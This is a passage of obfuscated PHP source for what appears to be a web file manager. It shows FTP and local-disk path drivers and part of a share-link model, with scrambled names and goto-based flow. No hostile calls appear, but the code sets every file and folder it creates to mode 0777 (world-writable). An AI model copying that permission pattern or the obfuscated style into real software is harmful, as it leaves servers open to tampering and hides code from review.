{ $BÉ¶›Åì…É = ftp_nb_continue($this->connect); } if ($BÉ¶›Åì…É != FTP_FINISHED) { return !1; } return $this->iconvApp($F¿²Œï½Ö); goto bä‹à„‘‘ø; E±øóß¬´ˆ: $c…Ÿõ±Çó‘ = $this->iconvSystem($c…Ÿõ±Çó‘); $F¿²Œï½Ö = $this->iconvSystem($F¿²Œï½Ö); $BÉ¶›Åì…É = ftp_nb_get($this->connect, $F¿²Œï½Ö, $c…Ÿõ±Çó‘, FTP_BINARY); goto f«Ôñœ•Ò; bä‹à„‘‘ø: } public function exist($CÕŠ”ŒÁ…é) { return $this->isFile($CÕŠ”ŒÁ…é) || $this->isFolder($CÕŠ”ŒÁ…é); } public function isFile($e‡ªÀÚ ) { return !$this->isFolder($e‡ªÀÚ ) && $this->objectMeta($e‡ªÀÚ ); } public function isFolder($B‰‘¬ñÛ) { return $this->cacheMethod($_SERVER[«¾°Ã¤][199], $B‰‘¬ñÛ); } protected function objectMeta($e„Â´Ğ¬÷â) { return $this->cacheMethod($_SERVER[«¾°Ã¤][200], $e„Â´Ğ¬÷â); } protected function _objectMeta($aòÔ‹ĞÙ) { goto f¯¿áÉÍÄŸ; f¯¿áÉÍÄŸ: $F“¨ğÜôÏ‹ =& $_SERVER[«¾°Ã¤]; if ($aòÔ‹ĞÙ == $F“¨ğÜôÏ‹[33] || $aòÔ‹ĞÙ == $F“¨ğÜôÏ‹[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto BôÀßªÇ¡Ò; BôÀßªÇ¡Ò: $aòÔ‹ĞÙ = $this->iconvSystem($aòÔ‹ĞÙ); $CŸåÛ›ÃöÑ = array($F“¨ğÜôÏ‹[28] => $this->iconvApp($aòÔ‹ĞÙ), $F“¨ğÜôÏ‹[29] => $F“¨ğÜôÏ‹[193], $F“¨ğÜôÏ‹[78] => 0); @ftp_chdir($this->connect, $F“¨ğÜôÏ‹[8]); goto F¨âå±”Êá; F¨âå±”Êá: $bŒô­­Ñ§‹ = @ftp_size($this->connect, $aòÔ‹ĞÙ); if ($bŒô­­Ñ§‹ != -1) { $CŸåÛ›ÃöÑ[$F“¨ğÜôÏ‹[78]] = $bŒô­­Ñ§‹; } else { $Eö‡©†Ô½ğ = @ftp_chdir($this->connect, $aòÔ‹ĞÙ); if (!$Eö‡©†Ô½ğ) { return !1; } $CŸåÛ›ÃöÑ[$F“¨ğÜôÏ‹[29]] = $F“¨ğÜôÏ‹[77]; } return $CŸåÛ›ÃöÑ; goto E‰‡½Ã„ï¯; E‰‡½Ã„ï¯: } protected function _isFolder($Bë™“ø½©) { $fçïÍ¡œØÀ =& $_SERVER[«¾°Ã¤]; if ($Bë™“ø½© == $fçïÍ¡œØÀ[33] || $Bë™“ø½© == $fçïÍ¡œØÀ[8]) { return !0; } $fÕáêÖ§ƒ… = $this->_objectMeta($Bë™“ø½©); return isset($fÕáêÖ§ƒ…[$fçïÍ¡œØÀ[29]]) && $fÕáêÖ§ƒ…[$fçïÍ¡œØÀ[29]] == $fçïÍ¡œØÀ[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($BÙ’öÉ…ØÇ) { if (substr($BÙ’öÉ…ØÇ, 0, 2) == $_SERVER[«¾°Ã¤][1246]) { $BÙ’öÉ…ØÇ = BASIC_PATH . substr($BÙ’öÉ…ØÇ, 2); } return $BÙ’öÉ…ØÇ; } public function iconvApp($D°‚àæÀÇë) { $Fù¿ò‰‡Ê =& $_SERVER[«¾°Ã¤]; global $config; return $this->iconvTo($D°‚àæÀÇë, $config[$Fù¿ò‰‡Ê[1244]], $config[$Fù¿ò‰‡Ê[1243]]); } public function iconvSystem($A¬Ç§õê´½) { $A¢Û©Å½‚Ú =& $_SERVER[«¾°Ã¤]; global $config; return $this->iconvTo($A¬Ç§õê´½, $config[$A¢Û©Å½‚Ú[1243]], $config[$A¢Û©Å½‚Ú[1244]]); } public function getPathOuter($aš¸œ°İ÷Í) { goto c Â‚îÍÈ¸; fÒä‡öÃ¼Û: return $this->pathDriver . $c›ƒ‘í™»ê[8] . ltrim($aš¸œ°İ÷Í, $c›ƒ‘í™»ê[8]); goto aŞ›ºÆêƒ‡; c Â‚îÍÈ¸: $c›ƒ‘í™»ê =& $_SERVER[«¾°Ã¤]; $D¢—‹ÀƒœÃ = $this->iconvApp($this->pathBase); $aš¸œ°İ÷Í = $this->iconvApp($aš¸œ°İ÷Í); goto D…ÒŠ É¡Ò; D…ÒŠ É¡Ò: if (substr($D¢—‹ÀƒœÃ, 0, 2) == $c›ƒ‘í™»ê[1246]) { $D¢—‹ÀƒœÃ = BASIC_PATH . substr($D¢—‹ÀƒœÃ, 2); } if (substr($aš¸œ°İ÷Í, 0, 2) == $c›ƒ‘í™»ê[1246]) { $aš¸œ°İ÷Í = BASIC_PATH . substr($aš¸œ°İ÷Í, 2); } $D¢—‹ÀƒœÃ = KodIO::clear($D¢—‹ÀƒœÃ); goto f™·›ñø; f™·›ñø: $aš¸œ°İ÷Í = KodIO::clear($aš¸œ°İ÷Í); $aš¸œ°İ÷Í = substr($aš¸œ°İ÷Í, strlen($D¢—‹ÀƒœÃ)); if (empty($this->pathDriver)) { return $aš¸œ°İ÷Í; } goto fÒä‡öÃ¼Û; aŞ›ºÆêƒ‡: } public function mkfile($CéØ¼¹Û‘÷, $cß×ìØğÆˆ = '', $Dì‰—¬óÅâ = REPEAT_RENAME) { $CéØ¼¹Û‘÷ = $this->iconvSystem($CéØ¼¹Û‘÷); @touch($CéØ¼¹Û‘÷); if ($cß×ìØğÆˆ) { file_put_contents($CéØ¼¹Û‘÷, $cß×ìØğÆˆ); } @chmod($CéØ¼¹Û‘÷, 511); return is_file($CéØ¼¹Û‘÷) ? $this->getPathOuter($CéØ¼¹Û‘÷) : !1; } public function mkdir($f•¢··ªœ·, $B‡Ç‹‡‹¿Î = REPEAT_SKIP) { $f•¢··ªœ· = $this->iconvSystem($f•¢··ªœ·); if (is_dir($f•¢··ªœ·)) { return $this->getPathOuter($f•¢··ªœ·); } @mkdir($f•¢··ªœ·, 511, !0); @chmod($f•¢··ªœ·, 511); return is_dir($f•¢··ªœ·) ? $this->getPathOuter($f•¢··ªœ·) : !1; } public function copyFile($eŠõ˜ÈÕ, $Bæ”×ŒÛè) { $this->mkdir($this->pathFather($Bæ”×ŒÛè)); $eŠõ˜ÈÕ = $this->iconvSystem($eŠõ˜ÈÕ); $Bæ”×ŒÛè = $this->iconvSystem($Bæ”×ŒÛè); $fœÖºè¢–ğ = copy_64($eŠõ˜ÈÕ, $Bæ”×ŒÛè); @chmod($Bæ”×ŒÛè, 511); return $fœÖºè¢–ğ ? $this->getPathOuter($Bæ”×ŒÛè) : !1; } public function moveFile($CŸòõİŞ»ò, $Dš÷¡¥µêÍ) { goto aİì¼ßÌÓ; c—ù³Æñ¦ï: return $cÏÌ£ñöê£ ? $this->getPathOuter($Dš÷¡¥µêÍ) : !1; goto A—®ôóŒÆ; aİì¼ßÌÓ: $this->mkdir($this->pathFather($Dš÷¡¥µêÍ)); $CŸòõİŞ»ò = $this->iconvSystem($CŸòõİŞ»ò); $Dš÷¡¥µêÍ = $this->iconvSystem($Dš÷¡¥µêÍ); goto c‘äµ È; c‘äµ È: $cÏÌ£ñöê£ = intval(@rename($CŸòõİŞ»ò, $Dš÷¡¥µêÍ)); if (!$cÏÌ£ñöê£) { if ($cÏÌ£ñöê£ = intval(@copy_64($CŸòõİŞ»ò, $Dš÷¡¥µêÍ))) { @unlink($CŸòõİŞ»ò); } } @chmod($Dš÷¡¥µêÍ, 511); goto c—ù³Æñ¦ï; A—®ôóŒÆ: } public function delFile($A†Êç…‚­) { $A†Êç…‚­ = $this->iconvSystem($A†Êç…‚­); if (!@unlink($A†Êç…‚­)) { @chmod($A†Êç…‚­, 511); if (!@unlink($A†Êç…‚­)) { return !1; } } else { return !0; } } public function delFolder($d´Áƒ¦À¸Ğ) { goto dñº†ÙŠ; CôğãƒßÁ©: if (!($aÑ¶·ù²İ‘ = opendir($d´Áƒ¦À¸Ğ))) { return !1; } while (($FéÄÊ•ë± = readdir($aÑ¶·ù²İ‘)) !== !1) { if ($FéÄÊ•ë± == $cÑîë—œÛ¹[95] || $FéÄÊ•ë± == $cÑîë—œÛ¹[1253]) { continue; } $aÃ…‚¢ÇÉ‹ = $d´Áƒ¦À¸Ğ . $cÑîë—œÛ¹[8] . $FéÄÊ•ë±; if (is_file($aÃ…‚¢ÇÉ‹) || is_link($aÃ…‚¢ÇÉ‹)) { if (!unlink($aÃ…‚¢ÇÉ‹)) { chmod($aÃ…‚¢ÇÉ‹, 511); if (!unlink($aÃ…‚¢ÇÉ‹)) { return !1; } } } else { if (is_dir($aÃ…‚¢ÇÉ‹)) { chmod($aÃ…‚¢ÇÉ‹, 511); $aÃ…‚¢ÇÉ‹ = $this->iconvApp($aÃ…‚¢ÇÉ‹); if (!$this->delFolder($aÃ…‚¢ÇÉ‹)) { return !1; } } } } closedir($aÑ¶·ù²İ‘); goto fï™³À¨Üé; fï™³À¨Üé: return rmdir($d´Áƒ¦À¸Ğ); goto D©™óò›¢È; dñº†ÙŠ: $cÑîë—œÛ¹ =& $_SERVER[«¾°Ã¤]; $d´Áƒ¦À¸Ğ = $this->iconvSystem($d´Áƒ¦À¸Ğ); if (!is_dir($d´Áƒ¦À¸Ğ)) { return !0; } goto CôğãƒßÁ©; D©™óò›¢È: } public function rename($C±â»öêÍì, $fÁ¶–¾ÚÑ‘) { goto C¬©¢Í‘ÊÉ; B§…×­ï¸: $C±â»öêÍì = $this->iconvSystem($C±â»öêÍì); $eâ«½óÂ¤Ñ = $this->pathFather($C±â»öêÍì); $A¯¼¼°õ¬ï = rtrim($eâ«½óÂ¤Ñ, $a¹«ª…’Ÿ[8]) . $a¹«ª…’Ÿ[8] . $b•ŸÛÅ²ò‡; goto c¦Ù÷Š—˜; C¬©¢Í‘ÊÉ: $a¹«ª…’Ÿ =& $_SERVER[«¾°Ã¤]; $b•ŸÛÅ²ò‡ = $this->fileNameAuto($this->pathFather($C±â»öêÍì), $fÁ¶–¾ÚÑ‘); $b•ŸÛÅ²ò‡ = $this->iconvSystem($b•ŸÛÅ²ò‡); goto B§…×­ï¸; c¦Ù÷Š—˜: $AĞŞÜ×Ì™õ = @rename($C±â»öêÍì, $A¯¼¼°õ¬ï); $A¯¼¼°õ¬ï = $this->iconvApp($A¯¼¼°õ¬ï); return $AĞŞÜ×Ì™õ ? $this->getPathOuter($A¯¼¼°õ¬ï) : !1; goto CİÅ¼¹¶; CİÅ¼¹¶: } public function size($f³Áƒæ¢š) { $f³Áƒæ¢š = $this->iconvSystem($f³Áƒæ¢š); return filesize_64($f³Áƒæ¢š); } public function info($dçâ—ÑÏµÃ) { $dçâ—ÑÏµÃ = $this->iconvSystem($dçâ—ÑÏµÃ); if ($this->isFolder($dçâ—ÑÏµÃ)) { return $this->folderInfo($dçâ—ÑÏµÃ); } else { if ($this->isFile($dçâ—ÑÏµÃ)) { return $this->fileInfo($dçâ—ÑÏµÃ); } } return !1; } protected function infoChildren($B‰±¬¶¡ë‚, &$f‡ˆç´ãæ‰, $F„ãˆ°ºÙ = true) { goto bÛÓ§á›Û°; bÛÓ§á›Û°: $BÕ¾—ã¯½ =& $_SERVER[«¾°Ã¤]; check_abort_echo(); $B‰±¬¶¡ë‚ = rtrim($B‰±¬¶¡ë‚, $BÕ¾—ã¯½[8]) . $BÕ¾—ã¯½[8]; goto c²´—¡ÙŠÑ; c²´—¡ÙŠÑ: if ($F„ãˆ°ºÙ) { $B‰±¬¶¡ë‚ = $this->iconvSystem($B‰±¬¶¡ë‚); } if (!($b‰Øó«õâª = @opendir($B‰±¬¶¡ë‚))) { return; } while (($D“óÏ†İÔ = readdir($b‰Øó«õâª)) !== !1) { if ($D“óÏ†İÔ == $BÕ¾—ã¯½[95] || $D“óÏ†İÔ == $BÕ¾—ã¯½[1253]) { continue; } $F´§Ø¿ë’« = $B‰±¬¶¡ë‚ . $D“óÏ†İÔ; if (is_file($F´§Ø¿ë’«) || is_link($F´§Ø¿ë’«)) { $f‡ˆç´ãæ‰[$BÕ¾—ã¯½[79]]++; $f‡ˆç´ãæ‰[$BÕ¾—ã¯½[78]] += filesize_64($F´§Ø¿ë’«); } else { if (is_dir($F´§Ø¿ë’«)) { $f‡ˆç´ãæ‰[$BÕ¾—ã¯½[80]]++; $this->infoChildren($F´§Ø¿ë’«, $f‡ˆç´ãæ‰, !1); } } } goto Dë²Ùœæä; Dë²Ùœæä: closedir($b‰Øó«õâª); goto a¡Ş´Î¸§†; a¡Ş´Î¸§†: } private function folderInfo($b‘ãÛÌêôÄ, $E¤ø¿„çŒˆ = false) { $EğŸæù„» =& $_SERVER[«¾°Ã¤]; $b‘ãÛÌêôÄ = rtrim($b‘ãÛÌêôÄ, $EğŸæù„»[8]) . $EğŸæù„»[8]; $CŒœ—»ğÖ• = $this->iconvApp($this->pathThis($b‘ãÛÌêôÄ)); if ($E¤ø¿„çŒˆ) { return array($EğŸæù„»[28] => $CŒœ—»ğÖ•, $EğŸæù„»[76] => $this->getPathOuter($b‘ãÛÌêôÄ), $EğŸæù„»[29] => $EğŸæù„»[77]); } $a¥ªµëœ§„ = array($EğŸæù„»[28] => $CŒœ—»ğÖ•, $EğŸæù„»[76] => $this->getPathOuter($b‘ãÛÌêôÄ), $EğŸæù„»[29] => $EğŸæù„»[77], $EğŸæù„»[194] => @filectime($b‘ãÛÌêôÄ), $EğŸæù„»[84] => @filemtime($b‘ãÛÌêôÄ), $EğŸæù„»[1256] => @fileatime($b‘ãÛÌêôÄ), $EğŸæù„»[1257] => is_readable($b‘ãÛÌêôÄ), $EğŸæù„»[1258] => is_writable($b‘ãÛÌêôÄ), $EğŸæù„»[1259] => get_mode($b‘ãÛÌêôÄ)); return $a¥ªµëœ§„; } private function fileInfo($EÂª¯œÜ‰Ú, $Dµáƒ÷¯¯ = false) { $CˆÊ±É® =& $_SERVER[«¾°Ã¤]; $DÑƒƒ­öøÏ = $this->iconvApp($this->pathThis($EÂª¯œÜ‰Ú)); if ($Dµáƒ÷¯¯) { return array($CˆÊ±É®[28] => $DÑƒƒ­öøÏ, $CˆÊ±É®[76] => $this->getPathOuter($EÂª¯œÜ‰Ú), $CˆÊ±É®[29] => $CˆÊ±É®[193], $CˆÊ±É®[78] => $this->size($EÂª¯œÜ‰Ú), $CˆÊ±É®[168] => $this->ext($DÑƒƒ­öøÏ)); } $cß¸ĞÁåÑ¶ = array($CˆÊ±É®[28] => $DÑƒƒ­öøÏ, $CˆÊ±É®[76] => $this->getPathOuter($EÂª¯œÜ‰Ú), $CˆÊ±É®[29] => $CˆÊ±É®[193], $CˆÊ±É®[194] => @filectime($EÂª¯œÜ‰Ú), $CˆÊ±É®[84] => @filemtime($EÂª¯œÜ‰Ú), $CˆÊ±É®[1256] => @fileatime($EÂª¯œÜ‰Ú), $CˆÊ±É®[78] => $this->size($EÂª¯œÜ‰Ú), $CˆÊ±É®[168] => $this->ext($DÑƒƒ­öøÏ), $CˆÊ±É®[1257] => is_readable($EÂª¯œÜ‰Ú), $CˆÊ±É®[1258] => is_writable($EÂª¯œÜ‰Ú), $CˆÊ±É®[1259] => get_mode($EÂª¯œÜ‰Ú)); return $cß¸ĞÁåÑ¶; } public function exist($E¹â®Š«Áê) { $E¹â®Š«Áê = $this->iconvSystem($E¹â®Š«Áê); return @file_exists($E¹â®Š«Áê); } public function isFile($b“‘ñÙÅÒ) { $b“‘ñÙÅÒ = $this->iconvSystem($b“‘ñÙÅÒ); return @is_file($b“‘ñÙÅÒ); } public function isFolder($Bã«Â„ğÅÔ) { $Bã«Â„ğÅÔ = $this->iconvSystem($Bã«Â„ğÅÔ); return @is_dir($Bã«Â„ğÅÔ); } public function listPath($dÃé¹™·…¥, $C½Ÿ¹Ğ¤ã” = false) { goto DÛù¼Ò›’¨; AÔÙä·Íó—: closedir($c™É°‹ÀÌ); return $e¾Óõ†˜Ô; goto ešªÍ™Â®”; D†Õ×ˆó¶Ä: $e¾Óõ†˜Ô = array($BŠ±Œ§É˜È[75] => array(), $BŠ±Œ§É˜È[74] => array()); if (!($c™É°‹ÀÌ = @opendir($dÃé¹™·…¥))) { return $e¾Óõ†˜Ô; } while (($fæÌğù‹´ = readdir($c™É°‹ÀÌ)) !== !1) { if ($fæÌğù‹´ == $BŠ±Œ§É˜È[95] || $fæÌğù‹´ == $BŠ±Œ§É˜È[1253]) { continue; } $d²òŒ÷õ® = $dÃé¹™·…¥ . $fæÌğù‹´; if (is_file($d²òŒ÷õ®)) { $e¾Óõ†˜Ô[$BŠ±Œ§É˜È[74]][] = $this->fileInfo($d²òŒ÷õ®, $C½Ÿ¹Ğ¤ã”); } else { $e¾Óõ†˜Ô[$BŠ±Œ§É˜È[75]][] = $this->folderInfo($d²òŒ÷õ®, $C½Ÿ¹Ğ¤ã”); } } goto AÔÙä·Íó—; DÛù¼Ò›’¨: $BŠ±Œ§É˜È =& $_SERVER[«¾°Ã¤]; $dÃé¹™·…¥ = $this->iconvSystem($dÃé¹™·…¥); $dÃé¹™·…¥ = rtrim($dÃé¹™·…¥, $BŠ±Œ§É˜È[8]) . $BŠ±Œ§É˜È[8]; goto D†Õ×ˆó¶Ä; ešªÍ™Â®”: } public function listAll($CğàÄ’‹ÑË, &$B‡”Š¶¢ï™ = array()) { goto Dê…é“ ¦; Cëõ’ñöÏ¸: if (!($Aİ‘³æ²æ£ = @opendir($CğàÄ’‹ÑË))) { return $B‡”Š¶¢ï™; } while (($F¹·×ÆŒŠ = readdir($Aİ‘³æ²æ£)) !== !1) { if ($F¹·×ÆŒŠ == $C’±½İ¦‰[95] || $F¹·×ÆŒŠ == $C’±½İ¦‰[1253]) { continue; } $C÷©ˆ¹É‹» = $CğàÄ’‹ÑË . $F¹·×ÆŒŠ; if (is_dir($C÷©ˆ¹É‹») && !is_link($C÷©ˆ¹É‹»)) { $B‡”Š¶¢ï™[] = array($C’±½İ¦‰[76] => $C÷©ˆ¹É‹» . $C’±½İ¦‰[8], $C’±½İ¦‰[77] => 1, $C’±½İ¦‰[84] => @filemtime($C÷©ˆ¹É‹»), $C’±½İ¦‰[78] => 0); $this->listAll($C÷©ˆ¹É‹», $B‡”Š¶¢ï™); } else { $B‡”Š¶¢ï™[] = array($C’±½İ¦‰[76] => $C÷©ˆ¹É‹», $C’±½İ¦‰[77] => 0, $C’±½İ¦‰[84] => @filemtime($C÷©ˆ¹É‹»), $C’±½İ¦‰[78] => $this->size($C÷©ˆ¹É‹»)); } } closedir($Aİ‘³æ²æ£); goto FµÈîŒÍ†; Dê…é“ ¦: $C’±½İ¦‰ =& $_SERVER[«¾°Ã¤]; $CğàÄ’‹ÑË = $this->iconvSystem($CğàÄ’‹ÑË); $CğàÄ’‹ÑË = rtrim($CğàÄ’‹ÑË, $C’±½İ¦‰[8]) . $C’±½İ¦‰[8]; goto Cëõ’ñöÏ¸; FµÈîŒÍ†: return $B‡”Š¶¢ï™; goto BÁ»‡ØŠÓ°; BÁ»‡ØŠÓ°: } public function has($fÓ©”²”Àñ, $AÙ‹éƒÙ®¾ = false, $aìó»£†‚Ÿ = true) { goto bŞÚÊç²İâ; a‹¬ìáìµ²: $BõõÉÀğ†¬ = 0; while (($DˆÀ¢Î®“¯ = readdir($d„å¤ ó­)) !== !1) { if ($DˆÀ¢Î®“¯ == $B¾‰–ÛÜ†¹[95] || $DˆÀ¢Î®“¯ == $B¾‰–ÛÜ†¹[1253]) { continue; } $dÙâšŒÙäë = $fÓ©”²”Àñ . $DˆÀ¢Î®“¯; if ($AÙ‹éƒÙ®¾) { $BõõÉÀğ†¬++; if (@is_file($dÙâšŒÙäë)) { $dŒÁ©¼óß‡++; } else { $fÚñˆ§Ò++; } if ($BõõÉÀğ†¬ > 10000) { break; } continue; } if ($aìó»£†‚Ÿ) { if (@is_file($dÙâšŒÙäë)) { return !0; } } else { if (@is_dir($dÙâšŒÙäë . $B¾‰–ÛÜ†¹[8])) { return !0; } } } closedir($d„å¤ ó­); goto aÂöÈ°çÅ¹; aÂöÈ°çÅ¹: if ($AÙ‹éƒÙ®¾) { return array($B¾‰–ÛÜ†¹[203] => $dŒÁ©¼óß‡, $B¾‰–ÛÜ†¹[204] => $fÚñˆ§Ò); } return !1; goto b¥‘ïÆôÖÁ; A˜ëøŸê”É: if (!($d„å¤ ó­ = @opendir($fÓ©”²”Àñ))) { return !1; } $dŒÁ©¼óß‡ = 0; $fÚñˆ§Ò = 0; goto a‹¬ìáìµ²; bŞÚÊç²İâ: $B¾‰–ÛÜ†¹ =& $_SERVER[«¾°Ã¤]; $fÓ©”²”Àñ = $this->iconvSystem($fÓ©”²”Àñ); $fÓ©”²”Àñ = rtrim($fÓ©”²”Àñ, $B¾‰–ÛÜ†¹[8]) . $B¾‰–ÛÜ†¹[8]; goto A˜ëøŸê”É; b¥‘ïÆôÖÁ: } public function hashSimple($dğ§òª‘«) { goto D‰å¬‚Éö; DğÂ‰ÛõÊ: fseek_64($Cˆ­×¿™Í, $aóßØÔ’‰œ - $eöÊ‡‘ŠÍ„); $B½¦Æëïøš .= fread($Cˆ­×¿™Í, $eöÊ‡‘ŠÍ„); fclose($Cˆ­×¿™Í); goto b‚„ñª·; AÂ¸øğê¯Ü: $aóßØÔ’‰œ = $this->size($dğ§òª‘«); $eöÊ‡‘ŠÍ„ = 200; $bºéÑ–·Ï÷ = 50; goto e²¿–õ‚¦·; b’¾óè¡¢å: $Cˆ­×¿™Í = fopen($dğ§òª‘«, $E‘ìôºèğ’[1260]); if (!$Cˆ­×¿™Í) { return $B½¦Æëïøš; } for ($B³°ĞñÏ’¾ = 0; $B³°ĞñÏ’¾ < $bºéÑ–·Ï÷; $B³°ĞñÏ’¾++) { fseek_64($Cˆ­×¿™Í, $aº‰˜¼‘Á† * $B³°ĞñÏ’¾); $B½¦Æëïøš .= fread($Cˆ­×¿™Í, $eöÊ‡‘ŠÍ„); } goto DğÂ‰ÛõÊ; b‚„ñª·: return md5($B½¦Æëïøš) . $aóßØÔ’‰œ; goto a¡‡ŠÊ™Œ; e²¿–õ‚¦·: if ($aóßØÔ’‰œ <= $eöÊ‡‘ŠÍ„ * $bºéÑ–·Ï÷) { return $this->hashMd5($dğ§òª‘«) . $aóßØÔ’‰œ; } $B½¦Æëïøš = $E‘ìôºèğ’[33]; $aº‰˜¼‘Á† = intval($aóßØÔ’‰œ / $bºéÑ–·Ï÷); goto b’¾óè¡¢å; D‰å¬‚Éö: $E‘ìôºèğ’ =& $_SERVER[«¾°Ã¤]; if (!$dğ§òª‘«) { return md5($E‘ìôºèğ’[33]); } $dğ§òª‘« = $this->iconvSystem($dğ§òª‘«); goto AÂ¸øğê¯Ü; a¡‡ŠÊ™Œ: } public function getContent($c¶‰©ëŸ„) { $c¶‰©ëŸ„ = $this->iconvSystem($c¶‰©ëŸ„); return file_get_contents($c¶‰©ëŸ„); } public function setContent($E¼ƒ´£Ó¦, $C²Ğöƒ´—‡ = '') { $E¼ƒ´£Ó¦ = $this->iconvSystem($E¼ƒ´£Ó¦); $Bè°ÙŠ…é = @file_put_contents($E¼ƒ´£Ó¦, $C²Ğöƒ´—‡, LOCK_EX); clearstatcache(); @chmod($E¼ƒ´£Ó¦, 511); return $Bè°ÙŠ…é === !1 ? !1 : !0; } public function fileSubstr($aàùÛ›®øÌ, $eÙäÔ˜ë®ò = 0, $Bï ¤ß²· = false) { goto E¿©è×Óš; E¿©è×Óš: $Eàë“æ©İ =& $_SERVER[«¾°Ã¤]; $aàùÛ›®øÌ = $this->iconvSystem($aàùÛ›®øÌ); if ($Bï ¤ß²· === !1) { $Bï ¤ß²· = $this->size($aàùÛ›®øÌ); } goto CÏŒ¾ÙŠª; CÏŒ¾ÙŠª: if ($Bï ¤ß²· <= 0) { return $Eàë“æ©İ[33]; } $D×½…©¦¬ó = fopen($aàùÛ›®øÌ, $Eàë“æ©İ[1260]); if (!$D×½…©¦¬ó) { return !1; } goto FøÇƒ¯â¡±; FøÇƒ¯â¡±: fseek_64($D×½…©¦¬ó, $eÙäÔ˜ë®ò); $bÍ±—™¡Úˆ = fread($D×½…©¦¬ó, $Bï ¤ß²·); fclose($D×½…©¦¬ó); goto e½¯³­ —º; e½¯³­ —º: return $bÍ±—™¡Úˆ; goto d‹§¢Æ¹¬; d‹§¢Æ¹¬: } public function upload($b£ÍçŒÇˆÎ, $F¼Ïá´½®, $BÊùÙ¶¹¾Ù = false, $d’îŒğ±’” = REPEAT_REPLACE) { if ($BÊùÙ¶¹¾Ù) { return $this->moveFile($F¼Ïá´½®, $b£ÍçŒÇˆÎ); } return $this->copyFile($F¼Ïá´½®, $b£ÍçŒÇˆÎ); } public function setModifyTime($E¨¯°»„‡¾, $F‚Œğö­İ = '') { @touch($E¨¯°»„‡¾, intval($F‚Œğö­İ)); } public function download($f¼ŸìŞ²Ûë, $F˜ŸÉ—îÁ¯) { return $this->iconvSystem($f¼ŸìŞ²Ûë); } } goto f®º²ß¿ƒÎ; b²œÌùì: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\x72\x65"; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\124\x69\155\145", "\x74\x69\155\x65", "\151\156\163\145\162\x74\54\x75\x70\x64\x61\164\x65", "\146\x75\x6e\x63\x74\x69\157\x6e"), array("\143\162\x65\x61\164\x65\x54\x69\155\x65", "\164\151\155\145", "\x69\156\x73\145\x72\x74", "\x66\165\156\x63\x74\151\x6f\156"), array("\157\160\x74\x69\157\x6e\163", '', "\151\156\163\145\162\164\54\165\160\x64\141\x74\x65\54\x73\145\154\x65\x63\x74", "\x6a\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($a·¾ÙÍß¼³) { $dÕ©±º†áÄ =& $_SERVER[«¾°Ã¤]; $eßƒÅ·‰‹  = isset($a·¾ÙÍß¼³[0]) ? $a·¾ÙÍß¼³[0] : !1; return array($dÕ©±º†áÄ[1821] => array(USER_ID, $dÕ©±º†áÄ[1822]), $dÕ©±º†áÄ[1765] => array($eßƒÅ·‰‹ , $dÕ©±º†áÄ[1823])); } protected function listSimple() { $dŞğ·Ú±¤¡ = array($_SERVER[«¾°Ã¤][1529] => USER_ID); $eÈÅŠŒ°¢‰ = $this->field($this->fieldList)->where($dŞğ·Ú±¤¡)->select(); return $eÈÅŠŒ°¢‰ ? $eÈÅŠŒ°¢‰ : array(); } protected function getInfo($C†Œ±÷Ş“â, $fòÑ¨”ÒÅ¾ = false) { $A¡œÕ†™±¿ =& $_SERVER[«¾°Ã¤]; if ($fòÑ¨”ÒÅ¾) { return $this->_getShareInfo(array($A¡œÕ†™±¿[477] => $C†Œ±÷Ş“â)); } $E’ÂñÏ‰­â = $this->cacheFunctionGet($A¡œÕ†™±¿[1772], $C†Œ±÷Ş“â); return $E’ÂñÏ‰­â; } public function getInfoByHash($DºÀ‰Å’ŒÖ) { return $this->_getShareInfo(array($_SERVER[«¾°Ã¤][479] => $DºÀ‰Å’ŒÖ)); } public function getInfoByPath($d‘â¶¥‹ƒ) { $B”‡±ç‘æ =& $_SERVER[«¾°Ã¤]; $cÁËÈ¨Î˜ = array($B”‡±ç‘æ[1529] => USER_ID, $B”‡±ç‘æ[404] => $d‘â¶¥‹ƒ); return $this->_getShareInfo($cÁËÈ¨Î˜); } public function getInfoBySourcePath($f¼ÈŸß†…‰) { $a´Ë¤â³œ½ =& $_SERVER[«¾°Ã¤]; $fãÓ‰ß×Ø = array($a´Ë¤â³œ½[1529] => USER_ID, $a´Ë¤â³œ½[1072] => $f¼ÈŸß†…‰); return $this->_getShareInfo($fãÓ‰ß×Ø); } private function _getShareInfo($e‰ºáŠîÔƒ) { goto e†®ëëÇ; a²†Ã‰ó™: $e‰ºáŠîÔƒ = array($cÀÀÊòºƒ[477] => $fÛÙö¹Š¶Ì[$cÀÀÊòºƒ[477]]); $A—Öáìêø = $cÀÀÊòºƒ[1824]; $d›¸‹¼¸ö‹ = Model($cÀÀÊòºƒ[573])->order($cÀÀÊòºƒ[393])->field($A—Öáìêø)->where($e‰ºáŠîÔƒ)->select(); goto B½Ööè»™Ô; e†®ëëÇ: $cÀÀÊòºƒ =& $_SERVER[«¾°Ã¤]; $fÛÙö¹Š¶Ì = $this->where($e‰ºáŠîÔƒ)->find(); if (!$fÛÙö¹Š¶Ì) { return !1; } goto a²†Ã‰ó™; B½Ööè»™Ô: if ($fÛÙö¹Š¶Ì[$cÀÀÊòºƒ[404]] == $cÀÀÊòºƒ[191]) { $fÛÙö¹Š¶Ì[$cÀÀÊòºƒ[85]] = IO::info($fÛÙö¹Š¶Ì[$cÀÀÊòºƒ[1072]]); } else { $fÛÙö¹Š¶Ì[$cÀÀÊòºƒ[85]] = Model($cÀÀÊòºƒ[1207])->pathInfo($fÛÙö¹Š¶Ì[$cÀÀÊòºƒ[404]]); } $fÛÙö¹Š¶Ì[$cÀÀÊòºƒ[1825]] = $d›¸‹¼¸ö‹; return $fÛÙö¹Š¶Ì; goto b´°ÜË»; b´°ÜË»: } protected function getInfoAuth($A›Èš‚†å) { $b¥š‘‘ ¡× =& $_SERVER[«¾°Ã¤]; $có˜ÜËê…î = $this->getInfo($A›Èš‚†å); $có˜ÜËê…î[$b¥š‘‘ ¡×[415]] = Model($b¥š‘‘ ¡×[491])->authMake($có˜ÜËê…î[$b¥š‘‘ ¡×[1825]]); return $có˜ÜËê…î; } protected function listData($CÔ…‰›ºâ = null, $c‰Ñï‰Õƒ = 300) { $FçÓæÅ®•“ =& $_SERVER[«¾°Ã¤]; $f‰Ã…Ö§È„ = array(array($FçÓæÅ®•“[482] => array($FçÓæÅ®•“[970], 0), $FçÓæÅ®•“[484] => 